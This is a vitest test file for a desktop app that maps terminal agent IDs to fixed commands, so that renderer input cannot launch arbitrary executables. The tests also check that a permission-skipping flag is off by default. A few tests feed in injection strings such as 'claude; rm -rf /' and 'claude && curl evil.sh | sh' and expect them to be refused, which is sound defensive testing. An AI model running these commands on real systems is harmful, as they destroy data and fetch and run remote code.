/**
 * @vitest-environment node
 *
 * CGLAB-169: which agent a terminal may launch.
 *
 * This is a security boundary, not a config list. The renderer runs the same
 * bundle a browser would, so if it could name the executable, an XSS in that
 * bundle would be arbitrary code execution on the user's machine with their
 * shell and their credentials. The renderer therefore picks an ID out of a
 * closed set and the main process maps that ID to a command — never the other
 * way round.
 *
 * The set is also not free-form: it is what AgEnFK actually integrates with.
 * Offering an agent the framework does not support produces a terminal that
 * opens onto "command not found", which reads as a broken app rather than as a
 * missing install.
 */
import { describe, it, expect } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import { fileURLToPath } from 'url';
import { AGENT_IDS, resolveAgentCommand, listAgents } from '../main/agents';

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../../..');

describe('the agent list tracks what AgEnFK supports', () => {
  it('offers only agents AgEnFK integrates with', () => {
    // The CLI's INTEGRATION_LABELS is the source of truth — it is what
    // `agenfk integration list` prints. Importing it here would drag the whole
    // CLI into the desktop main process, and the desktop set is a subset
    // anyway, so the relationship is asserted rather than expressed in code.
    // Adding an integration without considering it here fails this test.
    const cliSource = fs.readFileSync(path.join(repoRoot, 'packages/cli/src/index.ts'), 'utf8');
    const block = cliSource.split('const INTEGRATION_LABELS')[1].split('};')[0];
    const supported = [...block.matchAll(/^\s*'?([a-z-]+)'?:/gm)].map(m => m[1]);

    expect(supported.length).toBeGreaterThan(0);
    for (const id of AGENT_IDS) {
      if (id === 'shell') continue;
      expect(supported, `"${id}" is offered as an agent but AgEnFK does not integrate with it`).toContain(id);
    }
  });

  it('leaves cursor out — it is an editor, not a CLI to run in a terminal', () => {
    // AgEnFK integrates with Cursor, but there is nothing to spawn in a PTY;
    // enforcement there is instructional (see AFK_ARCHITECTURE.md). Listing it
    // would put an option in the menu that cannot work.
    expect(AGENT_IDS).not.toContain('cursor');
  });

  it('does not offer pi, which is a run-log format and not an installable integration', () => {
    // packages/server/src/agent-runs/pi-parser.ts exists, which makes "pi" look
    // available. It is the READ side of run ingestion; there is no integration
    // to install and nothing to spawn.
    expect(AGENT_IDS).not.toContain('pi');
  });

  it('defaults to Claude Code', () => {
    expect(AGENT_IDS[0]).toBe('claude');
  });

  it('offers a plain shell as the last resort', () => {
    // Not an agent, but the thing a user wants when no CLI is installed or
    // they just want to run git in the worktree.
    expect(AGENT_IDS).toContain('shell');
  });
});

describe('resolving an id to a command', () => {
  it('maps a known id to a command the main process chose', () => {
    const resolved = resolveAgentCommand('claude');
    expect(resolved.file).toBe('claude');
    expect(Array.isArray(resolved.args)).toBe(true);
  });

  it('refuses an id that is not in the set', () => {
    expect(() => resolveAgentCommand('definitely-not-an-agent')).toThrow(/unknown agent/i);
  });

  it('refuses an absolute path', () => {
    // The attack this whole indirection exists to stop.
    expect(() => resolveAgentCommand('/bin/sh')).toThrow(/unknown agent/i);
  });

  it('refuses a relative path that climbs out', () => {
    expect(() => resolveAgentCommand('../../usr/bin/env')).toThrow(/unknown agent/i);
  });

  it('refuses a command with shell metacharacters', () => {
    // node-pty takes file + argv and does not go through a shell, so this is
    // already inert — but an id that is not in the set must be refused on that
    // basis alone, before anyone reasons about quoting.
    expect(() => resolveAgentCommand('claude; rm -rf /')).toThrow(/unknown agent/i);
    expect(() => resolveAgentCommand('claude && curl evil.sh | sh')).toThrow(/unknown agent/i);
  });

  it('refuses an empty or non-string id', () => {
    expect(() => resolveAgentCommand('')).toThrow(/unknown agent/i);
    expect(() => resolveAgentCommand(undefined as unknown as string)).toThrow(/unknown agent/i);
    expect(() => resolveAgentCommand(null as unknown as string)).toThrow(/unknown agent/i);
  });

  it('never derives the command from the id by string manipulation', () => {
    // A mapping built as `{ file: id }` would pass every test above while
    // still being a lookup of attacker-controlled text. Every id must resolve
    // to an entry that was written down.
    for (const id of AGENT_IDS) {
      expect(() => resolveAgentCommand(id)).not.toThrow();
    }
    // A casing variant is not in the set, so it must be refused rather than
    // normalised into one.
    expect(() => resolveAgentCommand('CLAUDE')).toThrow(/unknown agent/i);
  });
});

describe('listing agents for the picker', () => {
  it('gives every agent a label a person can read', () => {
    for (const agent of listAgents()) {
      expect(agent.id).toBeTruthy();
      expect(agent.label).toBeTruthy();
      expect(agent.label).not.toBe(agent.id);
    }
  });

  it('lists them in menu order, with the default first', () => {
    expect(listAgents().map(a => a.id)).toEqual([...AGENT_IDS]);
  });
});

describe('auto-approve, the flag that turns off the agent\'s own safety rails', () => {
  it('is off unless explicitly asked for', async () => {
    // The default has to be the safe one. An agent running with permissions
    // skipped can edit, delete and push without asking, so this must never be
    // something a caller gets by forgetting a parameter.
    expect(resolveAgentCommand('claude').args).not.toContain('--dangerously-skip-permissions');
  });

  it('adds the real flag for an agent that has one', () => {
    const args = resolveAgentCommand('claude', { autoApprove: true }).args;
    expect(args).toContain('--dangerously-skip-permissions');
  });

  it('keeps multi-token flags as separate argv entries', () => {
    // codex needs several arguments. Passing them as one string would have the
    // whole thing delivered as a single argv element, which the CLI reads as
    // one nonsense option rather than as the settings intended.
    const args = resolveAgentCommand('codex', { autoApprove: true }).args;
    expect(args.some(a => a.includes(' ')), `an argv entry contains a space: ${JSON.stringify(args)}`).toBe(false);
    expect(args.length).toBeGreaterThan(1);
  });

  it('silently does nothing for an agent with no such flag', () => {
    // Inventing one would be worse than ignoring the request: a wrong flag
    // either fails the launch or, worse, means something else entirely.
    expect(resolveAgentCommand('gemini', { autoApprove: true }).args)
      .toEqual(resolveAgentCommand('gemini').args);
  });

  it('reports which agents can actually honour it', () => {
    // So the UI can disable the toggle with a reason instead of offering a
    // control that quietly does nothing.
    const byId = new Map(listAgents().map(a => [a.id, a]));
    expect(byId.get('claude')?.supportsAutoApprove).toBe(true);
    expect(byId.get('gemini')?.supportsAutoApprove).toBe(false);
    expect(byId.get('shell')?.supportsAutoApprove).toBe(false);
  });
});
